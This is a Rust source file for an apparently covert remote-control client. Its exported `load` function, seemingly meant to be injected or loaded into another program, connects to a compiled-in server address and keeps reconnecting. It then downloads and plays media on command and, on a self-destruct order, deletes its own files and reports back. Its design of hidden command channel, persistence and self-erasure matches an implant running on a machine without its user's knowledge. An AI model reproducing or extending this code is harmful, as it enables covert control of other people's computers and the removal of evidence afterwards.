use std::sync::Arc;
use std::fs;

use reqwest::Client;
use stream::create_stream;
use media::DataApi;
use state::Data;

use tokio::time::{sleep, Duration};
use futures_util::StreamExt;
use tokio::sync::RwLock;
// use winapi::um::cguid::GUID_NULL;
// use winapi::shared::winerror::S_OK;

mod state;
mod stream;
mod media;

pub const ADDR: &str = if cfg!(debug_assertions) { "http://localhost:7777" } else { include_str!("../addr.txt") };

async fn seppuku(client_id: u16) {
  let files = fs::read_dir(state::path()).unwrap();
  for file in files.flatten() {
    let _ = fs::remove_file(file.path());
  }

  let _ = fs::remove_dir_all(state::path());
  Client::new()
    .post(format!("{}/api/client/sepuku", ADDR))
    .header("X-Client-Id", client_id)
    .send()
    .await
    .unwrap();
}

#[no_mangle]
#[tokio::main]
#[allow(unreachable_code, unused_variables)]
pub async extern "C" fn load() -> bool {
  let data = Data::init().await;

  let client_id = data.id;
  let data = Arc::new(RwLock::new(data));

  loop {
    let mut stream = loop {
      match create_stream(client_id).await {
        Ok(stream) => break stream,
        Err(_) => sleep(Duration::from_secs(5)).await,
      }
    };

    while let Some(payload) = stream.next().await {
      let payload = match payload {
        Ok(payload) => payload,
        Err(e) => {
          continue;
        },
      };

      match payload {
        stream::Payload::Ready(delete) => {
          if delete {
            seppuku(client_id).await;
            return true;
          }
        },
        stream::Payload::Ping => {},
        stream::Payload::DownloadMedia(id) => data.download(id, client_id),
        stream::Payload::PlayMedia(id) => data.play(id),
        stream::Payload::StopMedia => data.stop(),
        stream::Payload::SelfDestruct => {
          seppuku(client_id).await;
          return true;
        },
      }
    }

    sleep(Duration::from_secs(5)).await;
  }
}
